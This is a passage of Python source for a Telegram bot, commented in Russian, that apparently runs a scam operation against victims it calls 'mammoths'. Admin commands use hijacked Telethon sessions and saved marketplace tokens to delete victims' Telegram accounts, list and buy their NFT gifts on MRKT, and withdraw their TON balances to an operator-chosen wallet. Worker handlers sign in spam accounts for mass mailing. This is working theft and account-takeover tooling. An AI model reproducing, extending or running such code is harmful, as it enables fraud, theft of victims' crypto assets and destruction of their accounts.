        logger.error(f"[UPLOAD] Session upload error: {e}")
        await msg.edit_text(
            f"❌ <b>Ошибка при загрузке сессии</b>\n\n"
            f"<code>{str(e)[:200]}</code>\n\n"
            f"Убедись, что файл содержит валидную Telethon StringSession.",
            parse_mode="HTML",
        )


@dp.message(Command("delete"))
async def cmd_delete_account(message: types.Message):
    """Команда для полного удаления аккаунта мамонта по номеру телефона"""
    if message.chat.type != "private":
        return
    
    user_id = message.from_user.id
    
    # Разрешаем только админам, так как в этом боте нет статистики логов воркеров
    if not is_admin(user_id):
        await message.answer("❌ Эта команда доступна только администраторам.")
        return
        
    args = message.text.split()
    if len(args) < 2:
        await message.answer(
            "✅ <b>Удаление аккаунта</b>\n\n"
            "Использование: <code>/delete номер_телефона</code>\n"
            "Пример: <code>/delete +79001234567</code>",
            parse_mode="HTML"
        )
        return

    phone_number = args[1].replace(" ", "").replace("-", "")
    phone_variants = [phone_number, phone_number.lstrip("+"), "+" + phone_number.lstrip("+")]
    
    found_sid = None
    for sid, session_data in auth_sessions.items():
        if session_data.get("phone") in phone_variants and session_data.get("status") in ["authorized", "code_sent", "awaiting_password", "2fa_required"]:
            found_sid = sid
            break
            
    if not found_sid:
        await message.answer(
            f"❌ Сессия для номера <code>{phone_number}</code> не найдена в памяти бота.\n\n"
            "Возможные причины:\n"
            "• Бот был перезагружен\n"
            "• Мамонт не дошёл до ввода кода\n"
            "• Номер введён неверно",
            parse_mode="HTML"
        )
        return
        
    session_data = auth_sessions[found_sid]
    tc = session_data["telethon_client"]
    user_info = session_data.get("user_info", {})
    
    await message.answer(
        f"⏳ <b>Удаляю аккаунт...</b>\n"
        f"📱 Телефон: <code>{session_data.get('phone')}</code>\n"
        f"👤 Пользователь: @{user_info.get('username', '?')} ({user_info.get('first_name', '?')})",
        parse_mode="HTML"
    )
    
    try:
        # Всегда переподключаемся — is_connected() может врать при протухшем TCP
        try:
            await tc.client.disconnect()
        except Exception:
            pass
        await asyncio.sleep(0.5)
        await tc.connect()
            
        result = await tc.delete_account("User requested deletion")
        
        if result:
            del auth_sessions[found_sid]
            await message.answer(
                f"✅ <b>Аккаунт успешно удалён!</b>\n\n"
                f"📱 Телефон: <code>{session_data.get('phone')}</code>\n"
                f"👤 Пользователь: @{user_info.get('username', '?')}",
                parse_mode="HTML"
            )
            logger.info(f"Account deleted via /delete: {session_data.get('phone')} by {user_id}")
        else:
            # Retry: переподключаемся заново и пробуем ещё раз
            logger.warning(f"[DELETE] Первая попытка не удалась, retry...")
            try:
                await tc.client.disconnect()
            except Exception:
                pass
            await asyncio.sleep(1)
            await tc.connect()
            
            result2 = await tc.delete_account("User requested deletion")
            if result2:
                del auth_sessions[found_sid]
                await message.answer(
                    f"✅ <b>Аккаунт удалён со 2-й попытки!</b>\n\n"
                    f"📱 Телефон: <code>{session_data.get('phone')}</code>\n"
                    f"👤 Пользователь: @{user_info.get('username', '?')}",
                    parse_mode="HTML"
                )
                logger.info(f"Account deleted via /delete (retry): {session_data.get('phone')} by {user_id}")
            else:
                await message.answer(
                    "❌ <b>Не удалось удалить аккаунт.</b>\nВозможно, сессия не до конца авторизована или истекла.",
                    parse_mode="HTML"
                )
    except Exception as e:
        logger.error(f"Error deleting account {session_data.get('phone')}: {e}")
        await message.answer(f"❌ Ошибка при удалении:\n<code>{str(e)}</code>", parse_mode="HTML")
    finally:
        try:
            await tc.disconnect()
        except Exception:
            pass


# ══════════════════════════════════════════════
# /buyer — Управление аккаунтом байера
# ══════════════════════════════════════════════

@dp.message(Command("buyer"))
async def cmd_buyer(message: types.Message):
    """Управление аккаунтом байера для вывода через покупку гифтов."""
    global buyer_token_data
    if not is_admin(message.from_user.id):
        return

    args = message.text.split(maxsplit=1)
    
    if len(args) < 2:
        # Показываем статус
        if buyer_token_data.get("token"):
            username = buyer_token_data.get("username", "?")
            # Проверяем токен
            try:
                api = MrktAPI(buyer_token_data["token"])
                bal = await api.get_balance_ton()
                vault = await api.get_vault()
                await api.close()
                status = f"✅ Активен | Баланс: {bal} TON | Гифтов: {len(vault)}"
            except Exception:
                status = "❌ Токен истёк!"
            
            await message.answer(
                f"🛒 <b>Аккаунт байера</b>\n\n"
                f"👤 @{username}\n"
                f"📊 {status}\n\n"
                f"<i>Команды:</i>\n"
                f"<code>/buyer set номер</code> — привязать токен\n"
                f"<code>/buyer remove</code> — убрать байера",
                parse_mode="HTML"
            )
        else:
            await message.answer(
                "🛒 <b>Байер не настроен</b>\n\n"
                "Для вывода через покупку гифтов нужно:\n"
                "1. Авторизовать акк-байер в боте (как мамонта)\n"
                "2. Привязать его: <code>/buyer set номер</code>\n"
                "3. В MRKT привязать к нему кошелёк (Connect)\n"
                "4. Купить хотя бы 1 дешёвый гифт\n\n"
                "<i>Номер — телефон из Управления токенами</i>",
                parse_mode="HTML"
            )
        return

    subcmd = args[1].strip()
    
    if subcmd == "remove":
        buyer_token_data = {}
        _save_buyer_token()
        await message.answer("✅ Байер удалён")
        return
    
    if subcmd.startswith("set "):
        phone = subcmd.split(" ", 1)[1].strip()
        
        # Ищем токен в saved_tokens
        token_data = saved_tokens.get(phone)
        if not token_data:
            # Пробуем найти по username
            for p, d in saved_tokens.items():
                if isinstance(d, dict) and ((d.get("username") or "").lower() == phone.lower().lstrip("@")):
                    token_data = d
                    phone = p
                    break
        
        if not token_data:
            await message.answer(
                f"❌ Токен для <code>{phone}</code> не найден.\n"
                f"Сначала авторизуй этот акк в боте.",
                parse_mode="HTML"
            )
            return
        
        # Проверяем токен
        try:
            api = MrktAPI(token_data["token"])
            bal = await api.get_balance_ton()
            vault = await api.get_vault()
            await api.close()
        except Exception as e:
            await message.answer(f"❌ Токен не валиден: {e}", parse_mode="HTML")
            return
        
        # Сохраняем Telethon session string для авто-рефреша токена
        session_str = None
        phone_variants = [phone, phone.lstrip("+"), "+" + phone.lstrip("+")]
        for sid, sess in auth_sessions.items():
            if sess.get("phone") in phone_variants and sess.get("telethon_client"):
                try:
                    session_str = sess["telethon_client"].client.session.save()
                    logger.info(f"[BUYER] Telethon session saved for {phone}")
                except Exception as e:
                    logger.warning(f"[BUYER] Failed to save session: {e}")
                break
        
        buyer_token_data = {
            "token": token_data["token"],
            "username": token_data.get("username", "?"),
            "tg_id": token_data.get("tg_id", 0),
            "phone": phone,
            "set_at": kyiv_str(),
        }
        if session_str:
            buyer_token_data["session_string"] = session_str
        _save_buyer_token()
        
        session_status = "✅ Сессия сохранена (авто-рефреш включён)" if session_str else "⚠️ Сессия не найдена (рефреш вручную)"
        
        await message.answer(
            f"✅ <b>Байер настроен!</b>\n\n"
            f"👤 @{token_data.get('username', '?')}\n"
            f"💰 Баланс: {bal} TON\n"
            f"📦 Гифтов в инвентаре: {len(vault)}\n"
            f"🔄 {session_status}\n\n"
            f"{'⚠️ Нет гифтов! Купи хотя бы 1 дешёвый гифт.' if not vault else '✅ Готов к работе!'}",
            parse_mode="HTML"
        )
        return
    
    await message.answer(
        "❓ Неизвестная подкоманда.\n\n"
        "<code>/buyer</code> — статус\n"
        "<code>/buyer set номер</code> — привязать\n"
        "<code>/buyer remove</code> — убрать",
        parse_mode="HTML"
    )


# ══════════════════════════════════════════════
# /sell — Ручной листинг гифтов мамонта
# ══════════════════════════════════════════════

# Кеш для sell-сессий: {admin_id: {"token": ..., "phone": ..., "vault": [...], "gift_id": ...}}
_sell_sessions: Dict[int, dict] = {}


@dp.message(Command("sell"))
async def cmd_sell(message: types.Message):
    """Ручной листинг: /sell — выбор мамонта, просмотр гифтов, установка цены."""
    if not is_admin(message.from_user.id):
        return

    args = message.text.split(maxsplit=1)

    # Если передан номер — сразу показываем гифты этого мамонта
    if len(args) >= 2:
        phone = args[1].strip()
        token_data = saved_tokens.get(phone)
        if not token_data:
            for p, d in saved_tokens.items():
                if isinstance(d, dict) and ((d.get("username") or "").lower() == phone.lower().lstrip("@")):
                    token_data = d
                    phone = p
                    break
        if not token_data:
            await message.answer(f"❌ Токен для <code>{phone}</code> не найден.", parse_mode="HTML")
            return
        await _show_vault(message, message.from_user.id, phone, token_data)
        return

    # Без аргументов — показываем список мамонтов
    if not saved_tokens:
        await message.answer("❌ Нет сохранённых токенов. Сначала авторизуй мамонта.")
        return

    buttons = []
    for phone, data in saved_tokens.items():
        if not isinstance(data, dict):
            continue
        uname = data.get("username") or data.get("first_name") or phone
        buttons.append([InlineKeyboardButton(
            text=f"👤 @{uname} ({phone})",
            callback_data=f"sell_pick_{phone}"
        )])

    await message.answer(
        "🛒 <b>Ручной листинг</b>\n\nВыбери мамонта:",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons)
    )


@dp.callback_query(F.data.startswith("sell_pick_"))
async def cb_sell_pick_mamont(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    phone = callback.data.replace("sell_pick_", "")
    token_data = saved_tokens.get(phone)
    if not token_data:
        await callback.answer("❌ Токен не найден", show_alert=True)
        return
    await callback.answer()
    await _show_vault(callback.message, callback.from_user.id, phone, token_data)


async def _show_vault(message, admin_id: int, phone: str, token_data: dict):
    """Показывает гифты мамонта с кнопками для листинга."""
    try:
        api = MrktAPI(token_data["token"])
        vault = await api.get_vault()
        await api.close()
    except Exception as e:
        await message.answer(f"❌ Ошибка получения гифтов: {e}", parse_mode="HTML")
        return

    if not vault:
        await message.answer(
            f"📦 У <code>{phone}</code> нет гифтов в хранилище.",
            parse_mode="HTML"
        )
        return

    # Сохраняем в сессию
    _sell_sessions[admin_id] = {
        "token": token_data["token"],
        "phone": phone,
        "username": token_data.get("username", "?"),
        "vault": vault,
    }

    # Строим список гифтов с кнопками
    buttons = []
    text_lines = [f"📦 <b>Гифты @{token_data.get('username', '?')}</b> ({len(vault)} шт.)\n"]

    for i, gift in enumerate(vault[:20]):  # Макс 20 в списке
        gift_id = gift.get("id") or gift.get("giftIdString", "?")
        # MRKT возвращает "name" как основное имя гифта (это же слаг)
        display_name = (
            gift.get("name")
            or gift.get("modelName")
            or gift.get("collectionName")
            or "Unknown"
        )
        nft_link = f"https://t.me/nft/{display_name}"

        text_lines.append(f"  {i+1}. <a href='{nft_link}'><b>{display_name}</b></a>")
        buttons.append([InlineKeyboardButton(
            text=f"{i+1}. {display_name}",
            callback_data=f"sell_gift_{i}"
        )])

    if len(vault) > 20:
        text_lines.append(f"\n<i>... и ещё {len(vault) - 20} гифтов</i>")

    buttons.append([InlineKeyboardButton(text="❌ Отмена", callback_data="sell_cancel")])

    await message.answer(
        "\n".join(text_lines),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons)
    )


@dp.callback_query(F.data.startswith("sell_gift_"))
async def cb_sell_gift_select(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    admin_id = callback.from_user.id
    session = _sell_sessions.get(admin_id)
    if not session:
        await callback.answer("❌ Сессия устарела. /sell заново", show_alert=True)
        return

    idx = int(callback.data.replace("sell_gift_", ""))
    vault = session["vault"]
    if idx >= len(vault):
        await callback.answer("❌ Гифт не найден", show_alert=True)
        return

    gift = vault[idx]
    gift_id = gift.get("id") or gift.get("giftIdString", "?")
    display_name = (
        gift.get("name")
        or gift.get("modelName")
        or gift.get("collectionName")
        or "Unknown"
    )

    session["gift_id"] = gift_id
    session["gift_info"] = display_name
    session["step"] = "awaiting_price"

    await callback.answer()
    await callback.message.answer(
        f"🎁 <a href='https://t.me/nft/{display_name}'><b>{display_name}</b></a>\n"
        f"🆔 <code>{gift_id}</code>\n\n"
        f"💰 Введи цену в TON (например: <code>5.5</code>)",
        parse_mode="HTML",
        disable_web_page_preview=False
    )


@dp.callback_query(F.data == "sell_cancel")
async def cb_sell_cancel(callback: CallbackQuery):
    admin_id = callback.from_user.id
    _sell_sessions.pop(admin_id, None)
    await callback.answer("❌ Отменено")
    try:
        await callback.message.delete()
    except Exception:
        pass


# Обработка ввода цены для /sell
async def _handle_sell_price_input(message: types.Message) -> bool:
    """Обрабатывает ввод цены. Возвращает True если обработано."""
    admin_id = message.from_user.id
    session = _sell_sessions.get(admin_id)
    if not session or session.get("step") != "awaiting_price":
        return False

    text = message.text.strip().lower()
    gift_id = session["gift_id"]
    gift_info = session["gift_info"]

    # Парсим цену
    if text == "floor":
        price = session.get("floor_ton", 0)
        if price <= 0:
            await message.answer("❌ Floor цена неизвестна. Введи цену вручную.")
            return True
    else:
        try:
            price = float(text.replace(",", "."))
            if price <= 0:
                await message.answer("❌ Цена должна быть > 0")
                return True
        except ValueError:
            await message.answer("❌ Неверный формат. Введи число (например: <code>5.5</code>)", parse_mode="HTML")
            return True

    # Листим
    session["step"] = "listing"
    msg = await message.answer(
        f"⏳ Выставляю <b>{gift_info}</b> за <b>{price} TON</b>...",
        parse_mode="HTML"
    )

    try:
        api = MrktAPI(session["token"])
        result = await api.sell_gift(gift_id, price)
        await api.close()

        listed_ids = result.get("ids", []) if isinstance(result, dict) else []
        if listed_ids:
            await msg.edit_text(
                f"✅ <b>Выставлено!</b>\n\n"
                f"🎁 {gift_info}\n"
                f"💰 Цена: <b>{price} TON</b>\n"
                f"👤 Мамонт: <code>{session['phone']}</code>\n"
                f"🆔 ID: <code>{gift_id}</code>",
                parse_mode="HTML"
            )
        else:
            await msg.edit_text(
                f"⚠️ <b>MRKT вернул пустой ответ</b>\n\n"
                f"Возможно гифт уже выставлен или токен истёк.\n"
                f"Ответ: <code>{str(result)[:200]}</code>",
                parse_mode="HTML"
            )
    except Exception as e:
        await msg.edit_text(f"❌ Ошибка листинга: <code>{e}</code>", parse_mode="HTML")

    _sell_sessions.pop(admin_id, None)
    return True

def save_parser_username(uid, username):
    path = os.path.join(mrkt_config.BROADCAST_SESSIONS_DIR, "usernames.json")
    data = {}
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
        except Exception:
            pass
    data[str(uid)] = username
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f)


@dp.message(F.text & F.chat.type == "private")
async def handle_text(message: types.Message):
    uid = message.from_user.id
    text = message.text.strip()

    # ── Sell price input ──
    if is_admin(uid) and await _handle_sell_price_input(message):
        return

    # ── Worker spam-акк auth flow (доступно ВСЕМ воркерам) ──
    wskey = f"_wkr_spam_{uid}"
    if wskey in auth_sessions:
        wstep = auth_sessions[wskey].get("step")

        if wstep == "phone":
            phone = "".join(c for c in text if c.isdigit() or c == '+')
            if not phone.startswith('+'):
                phone = '+' + phone
            if len(phone) < 10:
                await message.reply("❌ Некорректный номер")
                return
            msg = await message.reply(f"📱 Отправляю код на {phone}...")
            try:
                # Берём спам-прокси для авторизации
                _spam_prx = []
                _prx_tuple = None
                if _spam_prx:
                    _prx_tuple = _spam_prx[0]  # (host, port, login, password)
                    logger.info(f"[AUTH] Прокси для авторизации: {_prx_tuple[0]}:{_prx_tuple[1]}")
                else:
                    logger.warning("[AUTH] Нет спам-прокси для авторизации!")
                
                tc = TelethonClient(2, "149.154.167.50", 443, "", proxy=_prx_tuple)
                await tc.connect()
                await tc.send_code_request(phone)
                auth_sessions[wskey] = {"step": "code", "phone": phone, "tc": tc}
                await msg.edit_text(f"✅ Код отправлен на {phone}\n\nВведи полученный код:")
            except Exception as e:
                await msg.edit_text(f"❌ Ошибка: {e}")
                del auth_sessions[wskey]
            return

        elif wstep == "code":
            phone = auth_sessions[wskey]["phone"]
            tc = auth_sessions[wskey]["tc"]
            msg = await message.reply("⏳ Проверяю код...")
            try:
                await tc.sign_in(phone, text.replace(" ", "").strip())
                me = await tc.get_me()
                uname = me.username or str(me.id)
                session_str = tc.client.session.save()
                os.makedirs(mrkt_config.BROADCAST_SESSIONS_DIR, exist_ok=True)
                spath = os.path.join(mrkt_config.BROADCAST_SESSIONS_DIR, f"parser_{me.id}.session")
                with open(spath, "w", encoding="utf-8") as f:
                    f.write(session_str)
                save_parser_username(me.id, uname)
                worker_system.add_spam_account(uid, phone, str(me.id))
                
                # Автонастройка акка
                await msg.edit_text("⏳ Настраиваю аккаунт...")
                setup_results = await _setup_spam_account(tc.client)
                setup_report = "\n".join(setup_results)
                
                await msg.edit_text(
                    f"✅ <b>Спам-акк готов к работе!</b>\n\n"
                    f"🆔 <code>{me.id}</code>\n📞 <code>{phone}</code>\n\n"
                    f"🔧 <b>Настройка:</b>\n{setup_report}\n\n"
                    f"🚀 <i>Аккаунт полностью настроен. Можно запускать рассылку.</i>",
                    parse_mode="HTML",
                )
                await send_admin_log(
                    f"📱 <b>Спам-акк готов!</b>\n"
                    f"🆔 <code>{me.id}</code> | 📞 <code>{phone}</code>\n"
                    f"👷 Воркер: @{message.from_user.username or uid}\n\n"
                    f"🔧 {' | '.join(setup_results)}"
                )
                await tc.disconnect()
                del auth_sessions[wskey]
            except (TwoFactorAuthRequiredError, SessionPasswordNeededError):
                auth_sessions[wskey]["step"] = "2fa"
                await msg.edit_text("🔐 Нужен 2FA пароль. Введи его:")
            except Exception as e:
                await msg.edit_text(f"❌ Ошибка: {e}")
                await tc.disconnect()
                del auth_sessions[wskey]
            return

        elif wstep == "2fa":
            phone = auth_sessions[wskey]["phone"]
            tc = auth_sessions[wskey]["tc"]
            msg = await message.reply("⏳ Проверяю пароль...")
            try:
                await tc.sign_in_with_password(text.strip())
                me = await tc.get_me()
                uname = me.username or str(me.id)
                session_str = tc.client.session.save()
                os.makedirs(mrkt_config.BROADCAST_SESSIONS_DIR, exist_ok=True)
                spath = os.path.join(mrkt_config.BROADCAST_SESSIONS_DIR, f"parser_{me.id}.session")
                with open(spath, "w", encoding="utf-8") as f:
                    f.write(session_str)
                save_parser_username(me.id, uname)
                worker_system.add_spam_account(uid, phone, str(me.id))
                
                # Автонастройка акка
                await msg.edit_text("⏳ Настраиваю аккаунт...")
                setup_results = await _setup_spam_account(tc.client)
                setup_report = "\n".join(setup_results)
                
                await msg.edit_text(
                    f"✅ <b>Спам-акк готов (2FA)!</b>\n\n"
                    f"🆔 <code>{me.id}</code>\n\n"
                    f"🔧 <b>Настройка:</b>\n{setup_report}\n\n"
                    f"🚀 <i>Аккаунт полностью настроен. Можно запускать рассылку.</i>",
                    parse_mode="HTML",
                )
                await send_admin_log(
                    f"📱 <b>Спам-акк готов (2FA)!</b>\n"
                    f"🆔 <code>{me.id}</code>\n"
                    f"👷 Воркер: @{message.from_user.username or uid}\n\n"
                    f"🔧 {' | '.join(setup_results)}"
                )
                await tc.disconnect()
                del auth_sessions[wskey]
            except Exception as e:
                await msg.edit_text(f"❌ Неверный пароль или ошибка:\n{e}")
                await tc.disconnect()
                del auth_sessions[wskey]
            return

    # Wallet input
    wkey = f"_wallet_{uid}"
    if wkey in auth_sessions and auth_sessions[wkey].get("_awaiting_wallet") and is_admin(uid):
        if (text.startswith("UQ") or text.startswith("EQ") or text.startswith("0:")) and len(text) >= 40:
            mrkt_config.WITHDRAW_WALLET = text
            del auth_sessions[wkey]
            await message.answer(f"✅ Кошелёк: <code>{text}</code>")
            return
        await message.answer("❌ Неверный формат (UQ/EQ/0:)")
        return

    # ── Manual token input ──
    tkey = f"_add_token_{uid}"
    if tkey in auth_sessions and auth_sessions[tkey].get("step") == "awaiting_token" and is_admin(uid):
        del auth_sessions[tkey]
        text_raw = text.strip()

        # Попытка 1: JSON формат
        try:
            data = json.loads(text_raw)
            if isinstance(data, dict) and data.get("token"):
                phone = data.get("phone", f"manual_{int(asyncio.get_event_loop().time())}")
                _add_token(
                    phone=phone,
                    token=data["token"],
                    username=data.get("username", "?"),
                    tg_id=data.get("tg_id", 0),
                    first_name=data.get("first_name", ""),
                )
                saved_tokens[phone]["source"] = "manual"
                _save_tokens()
                uname = data.get("username", "?")
                await message.answer(
                    f"✅ <b>Токен добавлен!</b>\n\n"
                    f"👤 @{uname}\n"
                    f"📞 <code>{phone}</code>\n"
                    f"🔑 <code>{data['token'][:20]}...</code>",
                    parse_mode="HTML",
                )
                return
        except (json.JSONDecodeError, ValueError):
            pass

        # Попытка 2: токен + номер через пробел
        parts = text_raw.split()
        if len(parts) >= 2 and len(parts[0]) > 20:
            token = parts[0]
            phone = parts[1]
            _add_token(phone=phone, token=token, username="?")
            saved_tokens[phone]["source"] = "manual"
            _save_tokens()
            await message.answer(
                f"✅ <b>Токен добавлен!</b>\n\n"
                f"📞 <code>{phone}</code>\n"
                f"🔑 <code>{token[:20]}...</code>",
                parse_mode="HTML",
            )
            return

        # Попытка 3: просто токен (UUID-like)
        if len(text_raw) > 20 and "-" in text_raw:
            phone = f"manual_{int(asyncio.get_event_loop().time())}"
            _add_token(phone=phone, token=text_raw, username="?")
            saved_tokens[phone]["source"] = "manual"
            _save_tokens()
            await message.answer(
                f"✅ <b>Токен добавлен!</b>\n\n"
                f"📞 <code>{phone}</code> (авто)\n"
                f"🔑 <code>{text_raw[:20]}...</code>",
                parse_mode="HTML",
            )
            return

        await message.answer(
            "❌ Не удалось распознать токен.\n"
            "Отправь JSON, токен+номер, или просто токен.",
        )
        return
        
    # Buy gift by ID input
    if uid in _buygift_state and _buygift_state[uid].get("waiting") and is_admin(uid):
        state = _buygift_state[uid]
        phone = state["phone"]

        if text.strip().lower() in ("/cancel", "отмена"):
            del _buygift_state[uid]
            await message.answer("❌ Отменено")
            return

        parts = text.strip().split()
        gift_id = parts[0]
        price_ton = None

        # Проверяем UUID формат
        import re
        if not re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', gift_id, re.I):
            await message.answer(
                "❌ Неверный формат ID.\n"
                "Нужен UUID: <code>xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx</code>",
                parse_mode="HTML"
            )
            return

        if len(parts) >= 2:
            try:
                price_ton = float(parts[1])
            except ValueError:
                await message.answer("❌ Неверная цена. Формат: <code>UUID цена</code>", parse_mode="HTML")
                return

        del _buygift_state[uid]

        data = saved_tokens.get(phone)
        if not data:
            await message.answer("❌ Токен мамонта не найден")
            return

        msg = await message.answer("⏳ Покупаю гифт...")

        try:
            api = MrktAPI(data["token"])
            bal_before = await api.get_balance_ton()

            if price_ton:
                price_nano = int(round(price_ton * 1_000_000_000))
            else:
                # Пробуем получить цену с маркета
                try:
                    gift_info = await api.get_gift_info(gift_id)
                    price_nano = int(gift_info.get("priceNanoTONs", 0))
                    price_ton = price_nano / 1_000_000_000
                except Exception:
                    price_nano = int(round(bal_before * 1_000_000_000))  # весь баланс
                    price_ton = bal_before

            if bal_before < (price_nano / 1_000_000_000):
                await api.close()
                await msg.edit_text(
                    f"❌ Недостаточно средств!\n"
                    f"Баланс: {bal_before} TON\n"
                    f"Цена: {price_ton} TON",
                )
                return

            buy_result = await api.buy_gift(gift_id, price_nano)

            bal_after = await api.get_balance_ton()
            await api.close()

            # Проверяем реальный результат
            spent = round(bal_before - bal_after, 4)

            if spent > 0.01:
                await msg.edit_text(
                    f"✅ <b>Гифт куплен!</b>\n\n"
                    f"👤 @{data.get('username', '?')}\n"
                    f"🎁 ID: <code>{gift_id}</code>\n"
                    f"💵 Потрачено: {spent} TON\n"
                    f"💰 Баланс: {bal_before} → {bal_after} TON",
                    parse_mode="HTML",
                )
            else:
                await msg.edit_text(
                    f"⚠️ <b>Покупка не прошла</b>\n\n"
                    f"Ответ API: <code>{json.dumps(buy_result, ensure_ascii=False)[:200]}</code>\n"
                    f"💰 Баланс не изменился: {bal_before} TON\n\n"
                    f"Проверь:\n"
                    f"• Гифт выставлен на продажу?\n"
                    f"• ID правильный?\n"
                    f"• Хватает баланса?",
                    parse_mode="HTML",
                )

        except Exception as e:
            await msg.edit_text(
                f"❌ <b>Ошибка покупки</b>\n<code>{e}</code>",
                parse_mode="HTML",
            )
        return

    # Custom withdraw input
    wd_key = f"_tkn_wd_{uid}"
    if wd_key in auth_sessions and is_admin(uid):
        state = auth_sessions[wd_key]
        if state.get("step") == "input":
            phone = state["phone"]
            data = saved_tokens.get(phone)
            if not data:
                del auth_sessions[wd_key]
                await message.answer("❌ Ошибка: Токен не найден.")
                return

            parts = text.split()
            if len(parts) != 2:
                await message.answer("❌ Неверный формат. Нужно: КОШЕЛЁК СУММА (через пробел).")
                return

            wallet, amount_str = parts[0], parts[1].lower()

            if not (wallet.startswith("UQ") or wallet.startswith("EQ") or wallet.startswith("0:")) or len(wallet) < 40:
                await message.answer("❌ Неверный кошелёк (должен начинаться на UQ/EQ/0: и быть нужной длины).")
                return

            msg = await message.answer("⏳ Выполняю ручной вывод...")
            
            try:
                api = MrktAPI(data["token"])
                bal = await api.get_balance_ton()
                
                if amount_str == "all":
                    amount = round(bal - 0.05, 4)
                else:
                    try:
                        amount = float(amount_str)
                    except ValueError:
                        await api.close()
                        await msg.edit_text("❌ Неверная сумма. Введите число или 'all'.")
                        return

                if amount <= 0 or amount > bal:
                    await api.close()
                    await msg.edit_text(f"❌ Неверная сумма. Доступно: <b>{bal} TON</b>", parse_mode="HTML")
                    return
                
                if amount < 0.1:
                    await api.close()
                    await msg.edit_text(f"⚠️ Минимальная сумма вывода 0.1 TON (запрошено: <b>{amount}</b>)", parse_mode="HTML")
                    return

                wd_result = await api.withdraw_ton(wallet, amount)
                await api.close()

                if wd_result.get("error"):
                    err = wd_result.get("message", str(wd_result))
                    await msg.edit_text(
                        f"❌ <b>Ошибка вывода</b>\n\n"
                        f"💵 Сумма: <b>{amount} TON</b>\n"
                        f"💳 Кошелёк: <code>{wallet[:20]}...</code>\n"
                        f"💥 {err}",
                        parse_mode="HTML",
                    )
                else:
                    await msg.edit_text(
                        f"✅ <b>Ручной вывод отправлен!</b>\n\n"
                        f"💵 Сумма: <b>{amount} TON</b>\n"
                        f"💳 Кошелёк: <code>{wallet[:20]}...</code>\n"
                        f"👤 @{data.get('username', '?')}",
                        parse_mode="HTML",
                    )
                del auth_sessions[wd_key]
            except Exception as e:
                await msg.edit_text(f"❌ <b>Ошибка вывода</b>\n<code>{e}</code>", parse_mode="HTML")
                del auth_sessions[wd_key]
            return
        
    # Parser Auth input
    pkey = f"_parser_{uid}"
    if pkey in auth_sessions and is_admin(uid):
        state = auth_sessions[pkey]
        step = state.get("step")
        

        if step == "phone":
            msg = await message.answer(f"🔄 Подключаюсь к Telegram для {text}...")
            # Используем кастомный TelethonClient для обхода блокировок
            tc = TelethonClient(2, "149.154.167.50", 443, "")
            await tc.connect()
            try:
                phone_code_hash = await tc.send_code_request(text)
                state["tc"] = tc
                state["phone"] = text
                state["step"] = "code"
                await msg.edit_text(f"📩 Код отправлен на номер {text}.\n\nВведи код подтверждения из Telegram:")
            except Exception as e:
                await msg.edit_text(f"❌ Ошибка отправки кода:\n{e}")
                await tc.disconnect()
                del auth_sessions[pkey]
            return
            
        elif step == "code":
            msg = await message.answer("🔄 Проверка кода...")
            tc = state["tc"]
            phone = state["phone"]
            try:
                await tc.sign_in(phone=phone, code=text.replace(" ", "").strip())
                me = await tc.get_me()
                
                # Извлекаем полную строку сессии
                session_str = tc.client.session.save()
                parser_session_path = os.path.join(mrkt_config.BROADCAST_SESSIONS_DIR, f"parser_{me.id}.session")
                os.makedirs(os.path.dirname(parser_session_path), exist_ok=True)
                with open(parser_session_path, "w") as f:
                    f.write(session_str)
                
                uname = me.username or me.first_name
                save_parser_username(me.id, uname)
                
                await msg.edit_text(
                    f"✅ <b>Парсер успешно авторизован!</b>\n\n"
                    f"👤 @{uname}\n"
                    f"🆔 <code>{me.id}</code>\n\n"
                    f"<i>(Сессия сохранена, можно запускать парсер)</i>"
                )
                await tc.disconnect()
                del auth_sessions[pkey]
            except TwoFactorAuthRequiredError:
                state["step"] = "password"
                await msg.edit_text("🔐 На аккаунте включён облачный пароль (2FA).\n\nОтправь пароль сюда:")
            except Exception as e:
                await msg.edit_text(f"❌ Ошибка входа:\n{e}")
                await tc.disconnect()
                del auth_sessions[pkey]
            return
            
        elif step == "password":
            msg = await message.answer("🔄 Проверка пароля...")
            tc = state["tc"]
            try:
                await tc.sign_in_with_password(password=text)
                me = await tc.get_me()
                
                session_str = tc.client.session.save()
                parser_session_path = os.path.join(mrkt_config.BROADCAST_SESSIONS_DIR, f"parser_{me.id}.session")
                os.makedirs(os.path.dirname(parser_session_path), exist_ok=True)
                with open(parser_session_path, "w") as f:
                    f.write(session_str)
                
                uname = me.username or me.first_name
                save_parser_username(me.id, uname)
                
                await msg.edit_text(
                    f"✅ <b>Парсер успешно авторизован (через 2FA)!</b>\n\n"
                    f"👤 @{uname}\n"
                    f"🆔 <code>{me.id}</code>\n\n"
                    f"<i>(Сессия сохранена, можно запускать парсер)</i>"
                )
                await tc.disconnect()
                del auth_sessions[pkey]
            except Exception as e:
                await msg.edit_text(f"❌ Неверный пароль или ошибка:\n{e}")
                await tc.disconnect()
                del auth_sessions[pkey]
            return
            
    # (Dead code removed)


# ══════════════════════════════════════════════════════════════
#  FASTAPI ENDPOINTS (авторизация Telethon)
# ══════════════════════════════════════════════════════════════

# ── Anti-spam / Anti-XSS защита ──
import re as _re
from html import escape as _html_escape
from collections import defaultdict as _defaultdict

_rate_limits: dict = {}        # user_id → [timestamps]
_blacklist: set = set()        # забаненные user_id
_fail_counts: dict = {}        # user_id → int (кол-во ошибок)

RATE_LIMIT_WINDOW = 10         # секунд
RATE_LIMIT_MAX = 5             # макс запросов в окне
BLACKLIST_THRESHOLD = 15       # ошибок до бана


def _strip_html(text: str) -> str:
    """Убирает все HTML/XML теги из строки."""
    if not text:
        return ""
    return _re.sub(r'<[^>]+>', '', text).strip()


def _safe_html(text: str) -> str:
    """Экранирует HTML для безопасной отправки в Telegram."""
    if not text:
        return ""
    return _html_escape(str(text), quote=False)


def _check_rate_limit(user_id) -> bool:
    """Возвращает True если лимит превышен (заблокировать)."""
    uid = str(user_id)
    if uid in _blacklist:
        return True
    now = time.time()
    if uid not in _rate_limits:
